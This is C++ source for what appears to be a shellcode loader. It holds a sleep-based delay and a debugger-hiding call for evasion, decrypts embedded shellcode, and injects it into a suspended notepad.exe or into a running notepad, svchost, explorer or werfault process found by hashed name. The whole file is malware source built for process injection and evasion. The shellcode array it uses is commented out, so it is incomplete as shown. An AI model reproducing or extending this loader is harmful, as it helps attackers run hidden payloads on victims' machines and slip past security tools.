#include "config.hpp"
#include "malapi.hpp"
#include "execute.hpp"
#include "encrypt.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	DWORD	pid = 0;
	HANDLE	process_handle = INVALID_HANDLE_VALUE;

	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));

#pragma region Evasion

#if SLEEP_ENABLED
	SleepMethod(SLEEP_TIME);
#else
#endif

//#if ANTI_SANDBOX_ENABLED
//#else
//#endif

#if ANTI_DEBUG_ENABLED
	malapi::HideFromDebugger();
#else
#endif

#pragma endregion

#pragma region Decrypt

	DecryptShellcode(shellcode, sizeof(shellcode), key, sizeof(key));

#pragma endregion

#if CONFIG_CREATE_PROCESS
	LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
	process_handle = malapi::CreateSuspendedProcess((LPSTR)file_path);
#else
	constexpr ULONG targets[] = {
		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"),
		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
	};

	pid = malapi::GetPidFromHashedList((DWORD*)targets, 1);

	if (pid == NULL)
	{
		LOG_ERROR("Error getting Process ID.");
		return;
	}
	LOG_SUCCESS("Process ID: %d", pid);
	process_handle = malapi::GetProcessHandle(pid);
#endif

	if (!ExecuteShellcode(process_handle, shellcode, sizeof(shellcode)))
	{
		LOG_ERROR("Failed to execute shellcode.");
	}
}

#pragma region [alternate entrypoints]

int main(void) { entry(); return 0; }

#pragma endregion
